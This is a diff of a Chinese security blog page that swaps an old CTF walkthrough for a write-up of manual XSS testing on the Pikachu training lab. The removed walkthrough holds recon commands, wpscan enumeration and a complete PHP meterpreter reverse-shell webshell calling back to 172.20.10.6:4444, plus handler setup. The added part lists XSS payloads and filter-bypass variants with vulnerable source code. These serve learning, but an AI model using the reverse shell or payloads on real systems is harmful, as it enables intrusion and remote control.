@@ -6,30 +6,24 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href>
-  <title>内核提权 | Saw,Learnt,To think</title>
+  <title>XSS漏洞手工测试 | Saw,Learnt,To think</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="实验环境12攻击机 192.168.253.12靶场机 192.168.243.14">
-<meta name="keywords" content="CTF靶机系列">
+  <meta name="description" content="0X01 反射型XSS(get) 思路 按下F12, 输入的内容都会原封不动的显示在网页代码中,所以直接注入即可 但是有长度限制, 修改maxlength即可">
+<meta name="keywords" content="Pikachu靶机系列">
 <meta property="og:type" content="article">
-<meta property="og:title" content="内核提权">
-<meta property="og:url" content="/2019/09/16/内核提权/index.html">
+<meta property="og:title" content="XSS漏洞手工测试">
+<meta property="og:url" content="/2020/02/18/XSS漏洞手工测试/index.html">
 <meta property="og:site_name" content="Saw,Learnt,To think">
-<meta property="og:description" content="实验环境12攻击机 192.168.253.12靶场机 192.168.243.14">
+<meta property="og:description" content="0X01 反射型XSS(get) 思路 按下F12, 输入的内容都会原封不动的显示在网页代码中,所以直接注入即可 但是有长度限制, 修改maxlength即可">
 <meta property="og:locale" content="en">
-<meta property="og:image" content="/2019/09/16/内核提权/1.png">
-<meta property="og:image" content="/2019/09/16/内核提权/2.png">
-<meta property="og:image" content="/2019/09/16/内核提权/3.png">
-<meta property="og:image" content="/Users/caizhe/Desktop/CTF%E7%AC%94%E8%AE%B0/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/8.png">
-<meta property="og:image" content="/2019/09/16/内核提权/4.png">
-<meta property="og:image" content="/2019/09/16/内核提权/5.png">
-<meta property="og:image" content="/2019/09/16/内核提权/6.png">
-<meta property="og:image" content="/2019/09/16/内核提权/7.png">
-<meta property="og:image" content="/2019/09/16/内核提权/8.png">
-<meta property="og:updated_time" content="2020-02-13T14:13:58.340Z">
+<meta property="og:image" content="/2020/02/18/XSS漏洞手工测试/1.png">
+<meta property="og:image" content="/2020/02/18/XSS漏洞手工测试/2.png">
+<meta property="og:image" content="/2020/02/18/XSS漏洞手工测试/3.png">
+<meta property="og:updated_time" content="2020-02-18T08:02:34.160Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="内核提权">
-<meta name="twitter:description" content="实验环境12攻击机 192.168.253.12靶场机 192.168.243.14">
-<meta name="twitter:image" content="/2019/09/16/内核提权/1.png">
+<meta name="twitter:title" content="XSS漏洞手工测试">
+<meta name="twitter:description" content="0X01 反射型XSS(get) 思路 按下F12, 输入的内容都会原封不动的显示在网页代码中,所以直接注入即可 但是有长度限制, 修改maxlength即可">
+<meta name="twitter:image" content="/2020/02/18/XSS漏洞手工测试/1.png">
   
     <link rel="alternative" href="/atom.xml" title="Saw,Learnt,To think" type="application/atom+xml">
   
@@ -157,77 +151,249 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-内核提权" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-XSS漏洞手工测试" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      内核提权
+      XSS漏洞手工测试
     </h1>
   
 
         
-        <a href="/2019/09/16/内核提权/" class="archive-article-date">
-  	<time datetime="2019-09-16T09:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-16</time>
+        <a href="/2020/02/18/XSS漏洞手工测试/" class="archive-article-date">
+  	<time datetime="2020-02-18T08:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-18</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">攻击机 192.168.253.12</span><br><span class="line">靶场机 192.168.243.14</span><br></pre></td></tr></table></figure>
-
+        <h3 id="0X01-反射型XSS-get"><a href="#0X01-反射型XSS-get" class="headerlink" title="0X01 反射型XSS(get)"></a>0X01 反射型XSS(get)</h3><ul>
+<li><p>思路</p>
+<p>按下F12, 输入的内容都会原封不动的显示在网页代码中,所以直接注入即可</p>
+<p>但是有长度限制, 修改<code>maxlength</code>即可</p>
+</li>
+</ul>
 <a id="more"></a>
 
+<ul>
+<li><p>操作</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/02/18/XSS漏洞手工测试/1.png" alt="1"></p>
+</li>
+<li><p>源码分析</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$html=&apos;&apos;;</span><br><span class="line">if(isset($_GET[&apos;submit&apos;]))&#123;</span><br><span class="line">    if(empty($_GET[&apos;message&apos;]))&#123;</span><br><span class="line">        $html.=&quot;&lt;p class=&apos;notice&apos;&gt;输入&apos;kobe&apos;试试-_-&lt;/p&gt;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        if($_GET[&apos;message&apos;]==&apos;kobe&apos;)&#123;</span><br><span class="line">            $html.=&quot;&lt;p class=&apos;notice&apos;&gt;愿你和&#123;$_GET[&apos;message&apos;]&#125;一样，永远年轻，永远热血沸腾！&lt;/p&gt;&lt;img src=&apos;&#123;$PIKA_ROOT_DIR&#125;assets/images/nbaplayer/kobe.png&apos; /&gt;&quot;;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $html.=&quot;&lt;p class=&apos;notice&apos;&gt;who is &#123;$_GET[&apos;message&apos;]&#125;,i don&apos;t care!&lt;/p&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>$html.=&quot;&lt;p class=&#39;notice&#39;&gt;who is {$_GET[&#39;message&#39;]},i don&#39;t care!&lt;/p&gt;&quot;;</code>, 注入点在这一句代码</p>
+<p>而且<code>$_GET[&#39;message&#39;]</code> 变量没有做任何过滤, 就可以直接插入xss代码</p>
+</li>
+</ul>
+<h3 id="0X02-反射型XSS-post"><a href="#0X02-反射型XSS-post" class="headerlink" title="0X02 反射型XSS(post)"></a>0X02 反射型XSS(post)</h3><ul>
+<li><p>思路</p>
+<p>开始就是一个用户登入, 这里没有什么好注入的, 直接登入, 进入后, 发现和<code>0X01</code>一模一样,就不多说了</p>
+</li>
+<li><p>操作</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>源码分析</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$state = &apos;你已经登陆成功,&lt;a href=&quot;xss_reflected_post.php?logout=1&quot;&gt;退出登陆&lt;/a&gt;&apos;;</span><br><span class="line">$html=&apos;&apos;;</span><br><span class="line">if(isset($_POST[&apos;submit&apos;]))&#123;</span><br><span class="line">    if(empty($_POST[&apos;message&apos;]))&#123;</span><br><span class="line">        $html.=&quot;&lt;p class=&apos;notice&apos;&gt;输入&apos;kobe&apos;试试-_-&lt;/p&gt;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line"></span><br><span class="line">        //下面直接将前端输入的参数原封不动的输出了,出现xss</span><br><span class="line">        if($_POST[&apos;message&apos;]==&apos;kobe&apos;)&#123;</span><br><span class="line">            $html.=&quot;&lt;p class=&apos;notice&apos;&gt;愿你和&#123;$_POST[&apos;message&apos;]&#125;一样，永远年轻，永远热血沸腾！&lt;/p&gt;&lt;img src=&apos;&#123;$PIKA_ROOT_DIR&#125;assets/images/nbaplayer/kobe.png&apos; /&gt;&quot;;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $html.=&quot;&lt;p class=&apos;notice&apos;&gt;who is &#123;$_POST[&apos;message&apos;]&#125;,i don&apos;t care!&lt;/p&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>和上一题一样, 就不多分析了</p>
+</li>
+</ul>
+<h3 id="0X03-存储型XSS"><a href="#0X03-存储型XSS" class="headerlink" title="0X03 存储型XSS"></a>0X03 存储型XSS</h3><ul>
+<li><p>思路</p>
+<p>按下<code>F12</code>,  发现输入点是在<code>&lt;textarea&gt;</code>标签之下的, 很简单, 闭合标签即可</p>
+</li>
+<li><p>操作</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/textarea&gt;&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>执行之后, 查看一下网页代码, 发现已经成功存储进网页数据库</p>
+<p><img src="/2020/02/18/XSS漏洞手工测试/2.png" alt="2"></p>
+</li>
+<li><p>源码分析</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$html=&apos;&apos;;</span><br><span class="line">if(array_key_exists(&quot;message&quot;,$_POST) &amp;&amp; $_POST[&apos;message&apos;]!=null)&#123;</span><br><span class="line">    $message=escape($link, $_POST[&apos;message&apos;]);</span><br><span class="line">    $query=&quot;insert into message(content,time) values(&apos;$message&apos;,now())&quot;;</span><br><span class="line">    $result=execute($link, $query);</span><br><span class="line">    if(mysqli_affected_rows($link)!=1)&#123;</span><br><span class="line">        $html.=&quot;&lt;p&gt;数据库出现异常，提交失败！&lt;/p&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>未对变量$_POST[‘message’]进行过滤直接做了插入查询</p>
+</li>
+</ul>
+<h3 id="0X04-DOM型XSS"><a href="#0X04-DOM型XSS" class="headerlink" title="0X04 DOM型XSS"></a>0X04 DOM型XSS</h3><ul>
+<li><p>思路</p>
+<p>随便输入<code>asd</code>, 会将输入存入<code>href</code>属性</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;dom&quot;&gt;&lt;a href=&quot;asd&quot;&gt;what do you see?&lt;/a&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<ul>
+<li><p>操作</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#语法上没有错, 可能是闭合的双引号不匹对</span><br><span class="line">&quot; onclick=alert(&quot;xss&quot;)&gt;</span><br><span class="line"></span><br><span class="line">#用单引号闭合</span><br><span class="line">&apos; onclick=alert(&quot;xss&quot;)&gt;</span><br><span class="line">&apos;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&apos;xss&apos;)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<ul>
+<li><p>源码分析</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function domxss()&#123;</span><br><span class="line">	var str = document.getElementById(&quot;text&quot;).value;</span><br><span class="line">	document.getElementById(&quot;dom&quot;).innerHTML = &quot;&lt;a href=&apos;&quot;+str+&quot;&apos;&gt;what do you see?&lt;/a&gt;&quot;;</span><br><span class="line">                    &#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>现将文本输入复制给<code>str</code>变量</li>
+<li>再讲<code>str</code>, 交给浏览器的<code>DOM</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="0X05-DOM型XSS-X"><a href="#0X05-DOM型XSS-X" class="headerlink" title="0X05 DOM型XSS-X"></a>0X05 DOM型XSS-X</h3><ul>
+<li><p>思路</p>
+<ul>
+<li><p>输入内容后, 显示文字链接, <code>F12</code>检查元素也没有什么发现, 查看源码</p>
+</li>
+<li><p>在源码中发现, 搜索文字内容关键, 发现以下代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function domxss()&#123;</span><br><span class="line">	var str = window.location.search;</span><br><span class="line">	var txss = decodeURIComponent(str.split(&quot;text=&quot;)[1]);</span><br><span class="line">                        var xss = txss.replace(/\+/g,&apos; &apos;);</span><br><span class="line">//                        alert(xss);</span><br><span class="line"></span><br><span class="line">                        document.getElementById(&quot;dom&quot;).innerHTML = &quot;&lt;a href=&apos;&quot;+xss+&quot;&apos;&gt;就让往事都随风,都随风吧&lt;/a&gt;&quot;;</span><br><span class="line">                    &#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>审计代码, 只需要在<code>&quot;&lt;a href=&#39;&quot;+xss+&quot;&#39;&gt;</code>构造payload即可</p>
+</li>
+</ul>
+</li>
+<li><p>操作</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&apos;&gt;&lt;img src=&apos;#&apos; onmouseover=&quot;alert(&apos;xss&apos;)&quot;&gt;</span><br><span class="line">或</span><br><span class="line">#&apos; onclick=alert(&quot;xss&quot;)&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<ul>
+<li><p>源码分析</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function domxss()&#123;</span><br><span class="line">                        var str = window.location.search;</span><br><span class="line">                        var txss = decodeURIComponent(str.split(&quot;text=&quot;)[1]);</span><br><span class="line">                        var xss = txss.replace(/\+/g,&apos; &apos;);</span><br><span class="line">//                        alert(xss);</span><br><span class="line"></span><br><span class="line">                        document.getElementById(&quot;dom&quot;).innerHTML = &quot;&lt;a href=&apos;&quot;+xss+&quot;&apos;&gt;就让往事都随风,都随风吧&lt;/a&gt;&quot;;</span><br><span class="line">                    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>和网页右键源码一样, 就不多分析了</p>
+</li>
+</ul>
+<h3 id="0X06-xss之盲打"><a href="#0X06-xss之盲打" class="headerlink" title="0X06 xss之盲打"></a>0X06 xss之盲打</h3><ul>
+<li><p>思路</p>
+<ul>
+<li>输入一个基本的js弹窗, 发现可能是直接传输到后台</li>
+<li>根据提示,<code>admin_login.php</code>访问登入</li>
+</ul>
+</li>
+<li><p>操作</p>
+<ul>
+<li><p>输入基础payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>登入后台查看反应</p>
+<p><img src="/2020/02/18/XSS漏洞手工测试/3.png" alt="3"></p>
+</li>
+</ul>
+</li>
+<li><p>源码分析</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">if(array_key_exists(&quot;content&quot;,$_POST) &amp;&amp; $_POST[&apos;content&apos;]!=null)&#123;</span><br><span class="line">    $content=escape($link, $_POST[&apos;content&apos;]);</span><br><span class="line">    $name=escape($link, $_POST[&apos;name&apos;]);</span><br><span class="line">    $time=$time=date(&apos;Y-m-d g:i:s&apos;);</span><br><span class="line">    $query=&quot;insert into xssblind(time,content,name) values(&apos;$time&apos;,&apos;$content&apos;,&apos;$name&apos;)&quot;;</span><br><span class="line">    $result=execute($link, $query);</span><br><span class="line">    if(mysqli_affected_rows($link)==1)&#123;</span><br><span class="line">        $html.=&quot;&lt;p&gt;谢谢参与，阁下的看法我们已经收到!&lt;/p&gt;&quot;;</span><br><span class="line">    &#125;else &#123;</span><br><span class="line">        $html.=&quot;&lt;p&gt;ooo.提交出现异常，请重新提交&lt;/p&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p> 直接获取用户输入, 并执行了<code>$query</code>变量的内容</p>
+</li>
+</ul>
+<h3 id="0X07-XSS之过滤"><a href="#0X07-XSS之过滤" class="headerlink" title="0X07 XSS之过滤"></a>0X07 XSS之过滤</h3><ul>
+<li><p>思路</p>
+<p>输入js弹窗代码, 发现<code>script</code>被过滤掉了</p>
+<p>可以大小写,<code>&lt;Script&gt;</code></p>
+<p> HTML实体编码, &amp;#19</p>
+<p>拼凑,<code>&lt;Scr&lt;Script&gt;ipt&gt;</code></p>
+<p>注释干扰, <code>&lt;Scr&lt;!--test--&gt;ipt&gt;</code></p>
+</li>
+<li><p>操作</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#大写一个s字母,发现没有用</span><br><span class="line">&lt;Script&gt;alert(&quot;xss&quot;)&lt;/Script&gt;</span><br><span class="line">#大写两个字母, 成功弹窗</span><br><span class="line">&lt;ScripT&gt;alert(&quot;xss&quot;)&lt;/ScripT&gt;</span><br><span class="line">#或</span><br><span class="line">&lt;img src=1 onerror=&quot;alert(&apos;xss&apos;)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<ul>
+<li><p>源码分析</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&apos;submit&apos;]) &amp;&amp; $_GET[&apos;message&apos;] != null)&#123;</span><br><span class="line">    //这里会使用正则对&lt;script进行替换为空,也就是过滤掉</span><br><span class="line">    $message=preg_replace(&apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/&apos;, &apos;&apos;, $_GET[&apos;message&apos;]);</span><br><span class="line">//    $message=str_ireplace(&apos;&lt;script&gt;&apos;,$_GET[&apos;message&apos;]);</span><br><span class="line"></span><br><span class="line">    if($message == &apos;yes&apos;)&#123;</span><br><span class="line">        $html.=&quot;&lt;p&gt;那就去人民广场一个人坐一会儿吧!&lt;/p&gt;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $html.=&quot;&lt;p&gt;别说这些&apos;&#123;$message&#125;&apos;的话,不要怕,就是干!&lt;/p&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 
 
 
 
+</li>
+</ul>
+<h3 id="0X08-XSS之htmlspecialchars"><a href="#0X08-XSS之htmlspecialchars" class="headerlink" title="0X08 XSS之htmlspecialchars()"></a>0X08 XSS之htmlspecialchars()</h3><ul>
+<li><p>思路</p>
+<ul>
+<li><p>htmlspecialchars()函数把预定的字符转化为HTML实体</p>
+<p>&amp; → &amp;amp</p>
+<p>“ → &amp;quot</p>
+<p>‘ → &amp;#039</p>
+<p>&lt; → &amp;lt </p>
+<p><code>&gt;</code> → &amp;gt</p>
+</li>
+<li><p>右键查看源码, 看看我们的输入被转化成了什么</p>
+</li>
+<li><p>发现, 输入在<code>href</code>属性内, 且经过了htmlspecialchars()函数转化, 但是<code>&#39;</code>没有做处理</p>
+</li>
+</ul>
+</li>
+<li><p>操作</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&apos; onclick=alert(&apos;xss&apos;) \\</span><br></pre></td></tr></table></figure>
 
-<h3 id="步骤一：信息收集"><a href="#步骤一：信息收集" class="headerlink" title="步骤一：信息收集"></a>步骤一：信息收集</h3><h4 id="①扫描靶机ip地址"><a href="#①扫描靶机ip地址" class="headerlink" title="①扫描靶机ip地址"></a>①扫描靶机ip地址</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -r 192.168.1.1/24</span><br></pre></td></tr></table></figure>
 
-<p>发现，192.168.253.14</p>
-<h4 id="②利用nmap扫描详细信息"><a href="#②利用nmap扫描详细信息" class="headerlink" title="②利用nmap扫描详细信息"></a>②利用nmap扫描详细信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#探测开放服务与服务版本</span><br><span class="line">nmap -sV 192.168.253.14</span><br><span class="line"></span><br><span class="line">#探测全部信息</span><br><span class="line">nmap -A -V -T4 192.168.253.14</span><br><span class="line"></span><br><span class="line">#探测操作系统类型与版本</span><br><span class="line">nmap -O 192.168.253.14</span><br></pre></td></tr></table></figure>
 
-<h4 id="③挖掘敏感信息"><a href="#③挖掘敏感信息" class="headerlink" title="③挖掘敏感信息"></a>③挖掘敏感信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nikto -host 192.168.253.14</span><br><span class="line">或</span><br><span class="line">dirb http://192.168.253.14</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<ul>
+<li><p>源码分析</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&apos;submit&apos;]))&#123;</span><br><span class="line">    if(empty($_GET[&apos;message&apos;]))&#123;</span><br><span class="line">        $html.=&quot;&lt;p class=&apos;notice&apos;&gt;输入点啥吧！&lt;/p&gt;&quot;;</span><br><span class="line">    &#125;else &#123;</span><br><span class="line">        //使用了htmlspecialchars进行处理,是不是就没问题了呢,htmlspecialchars默认不对&apos;处理</span><br><span class="line">        $message=htmlspecialchars($_GET[&apos;message&apos;]);</span><br><span class="line">        $html1.=&quot;&lt;p class=&apos;notice&apos;&gt;你的输入已经被记录:&lt;/p&gt;&quot;;</span><br><span class="line">        //输入的内容被处理后输出到了input标签的value属性里面,试试:&apos; onclick=&apos;alert(111)&apos;</span><br><span class="line">//        $html2.=&quot;&lt;input class=&apos;input&apos; type=&apos;text&apos; name=&apos;inputvalue&apos; readonly=&apos;readonly&apos; value=&apos;&#123;$message&#125;&apos; style=&apos;margin-left:120px;display:block;background-color:#c0c0c0;border-style:none;&apos;/&gt;&quot;;</span><br><span class="line">        $html2.=&quot;&lt;a href=&apos;&#123;$message&#125;&apos;&gt;&#123;$message&#125;&lt;/a&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<h3 id="步骤二：信息分析"><a href="#步骤二：信息分析" class="headerlink" title="步骤二：信息分析"></a>步骤二：信息分析</h3><h4 id="①nikto发现-WordPress应用"><a href="#①nikto发现-WordPress应用" class="headerlink" title="①nikto发现 WordPress应用"></a>①nikto发现 WordPress应用</h4><p><img src="/2019/09/16/内核提权/1.png" alt="1"></p>
-<h4 id="②漏洞扫描"><a href="#②漏洞扫描" class="headerlink" title="②漏洞扫描"></a>②漏洞扫描</h4><p>==我们可以将WordPress判断为一个 CMS（内容管理系统）==，可直接利用kali扫描工具</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#枚举WordPress主题、插件、用户名</span><br><span class="line">wpscan --url http://192.168.253.14/wordpress --enumerate at --enumerate ap --enumerate u</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2019/09/16/内核提权/2.png" alt="2"></p>
-<p>结果如下</p>
-<p><img src="/2019/09/16/内核提权/3.png" alt="3"></p>
-<h3 id="步骤三：webshell控制"><a href="#步骤三：webshell控制" class="headerlink" title="步骤三：webshell控制"></a>步骤三：webshell控制</h3><h4 id="①生成webshell"><a href="#①生成webshell" class="headerlink" title="①生成webshell"></a>①生成webshell</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=172.20.10.6 lport=4444 -f raw</span><br></pre></td></tr></table></figure>
 
-<p>代码为：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php /**/ error_reporting(0); $ip = &apos;172.20.10.6&apos;; $port = 4444; if (($f = &apos;stream_socket_client&apos;) &amp;&amp; is_callable($f)) &#123; $s = $f(&quot;tcp://&#123;$ip&#125;:&#123;$port&#125;&quot;); $s_type = &apos;stream&apos;; &#125; if (!$s &amp;&amp; ($f = &apos;fsockopen&apos;) &amp;&amp; is_callable($f)) &#123; $s = $f($ip, $port); $s_type = &apos;stream&apos;; &#125; if (!$s &amp;&amp; ($f = &apos;socket_create&apos;) &amp;&amp; is_callable($f)) &#123; $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) &#123; die(); &#125; $s_type = &apos;socket&apos;; &#125; if (!$s_type) &#123; die(&apos;no socket funcs&apos;); &#125; if (!$s) &#123; die(&apos;no socket&apos;); &#125; switch ($s_type) &#123; case &apos;stream&apos;: $len = fread($s, 4); break; case &apos;socket&apos;: $len = socket_read($s, 4); break; &#125; if (!$len) &#123; die(); &#125; $a = unpack(&quot;Nlen&quot;, $len); $len = $a[&apos;len&apos;]; $b = &apos;&apos;; while (strlen($b) &lt; $len) &#123; switch ($s_type) &#123; case &apos;stream&apos;: $b .= fread($s, $len-strlen($b)); break; case &apos;socket&apos;: $b .= socket_read($s, $len-strlen($b)); break; &#125; &#125; $GLOBALS[&apos;msgsock&apos;] = $s; $GLOBALS[&apos;msgsock_type&apos;] = $s_type; if (extension_loaded(&apos;suhosin&apos;) &amp;&amp; ini_get(&apos;suhosin.executor.disable_eval&apos;)) &#123; $suhosin_bypass=create_function(&apos;&apos;, $b); $suhosin_bypass(); &#125; else &#123; eval($b); &#125; die();</span><br></pre></td></tr></table></figure>
 
-<h4 id="②上传webshell"><a href="#②上传webshell" class="headerlink" title="②上传webshell"></a>②上传webshell</h4><p><img src="/Users/caizhe/Desktop/CTF%E7%AC%94%E8%AE%B0/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/8.png" alt="8"></p>
-<h4 id="③设置监听"><a href="#③设置监听" class="headerlink" title="③设置监听"></a>③设置监听</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload php/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.253.14</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
 
-<p>访问网站</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.253.14/secret/wp-content/themes/twentyseventeen/404.php</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="0X09-XSS之href输出"><a href="#0X09-XSS之href输出" class="headerlink" title="0X09 XSS之href输出"></a>0X09 XSS之href输出</h3><ul>
+<li><p>思路</p>
+<p>输入a, 右键查看源码, 发现, a处于<code>href</code>属性内, 被套上了单引号</p>
+<p>且, 在构造<code>a&#39; onclick=alert(xss)</code>, 单引号被实体编码了</p>
